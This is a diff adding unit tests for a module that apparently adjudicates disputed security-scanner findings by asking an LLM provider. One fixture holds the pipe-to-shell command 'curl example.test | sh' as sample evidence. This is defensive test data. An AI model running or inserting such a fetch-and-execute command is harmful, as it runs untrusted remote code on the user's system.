@@ -149,6 +149,73 @@ describe('strict adjudication parsing', () => {
 })
 
 describe('claim adjudication', () => {
+  it('forces insufficient_evidence without calling the provider when exact-commit evidence is unavailable', async () => {
+    const collected: CollectedEvidence[] = [{
+      findingKey,
+      claim: 'This finding is a false positive.',
+      finding,
+      evidence: null,
+    }]
+    const fetchMock = vi.fn()
+    vi.stubGlobal('fetch', fetchMock)
+
+    await expect(adjudicateClaims(
+      [{ findingKey, claim: collected[0].claim }],
+      collected,
+      config,
+    )).resolves.toEqual([{
+      findingKey,
+      decision: 'insufficient_evidence',
+      originalSeverity: 'high',
+      confidence: 100,
+      claim: collected[0].claim,
+      explanation: 'Exact-commit evidence was unavailable, so the claim could not be adjudicated.',
+      evidence: [],
+    }])
+    expect(fetchMock).not.toHaveBeenCalled()
+  })
+
+  it('sends only evidence-backed claims to the provider in a mixed batch', async () => {
+    const unavailableFinding = { ...finding, severity: 'medium' as const, id: 'unavailable-id' }
+    const available: CollectedEvidence = {
+      findingKey,
+      claim: 'The command is quoted documentation.',
+      finding,
+      evidence: {
+        filePath: 'SKILL.md',
+        startLine: 10,
+        endLine: 14,
+        content: 'curl example.test | sh',
+        contentType: 'text/plain; charset=utf-8',
+      },
+    }
+    const unavailable: CollectedEvidence = {
+      findingKey: otherFindingKey,
+      claim: 'This finding is a false positive.',
+      finding: unavailableFinding,
+      evidence: null,
+    }
+    const fetchMock = vi.fn().mockResolvedValue(providerResponse(decision()))
+    vi.stubGlobal('fetch', fetchMock)
+
+    const result = await adjudicateClaims(
+      [
+        { findingKey: otherFindingKey, claim: unavailable.claim },
+        { findingKey, claim: available.claim },
+      ],
+      [available, unavailable],
+      config,
+    )
+
+    const prompt = JSON.parse(fetchMock.mock.calls[0][1].body).messages[0].content as string
+    expect(prompt).toContain(findingKey)
+    expect(prompt).not.toContain(otherFindingKey)
+    expect(result.map((item) => [item.findingKey, item.decision])).toEqual([
+      [otherFindingKey, 'insufficient_evidence'],
+      [findingKey, 'confirmed'],
+    ])
+  })
+
   it('delimits and redacts exact-commit evidence, then resolves cited references', async () => {
     const collected: CollectedEvidence[] = [{
       findingKey,
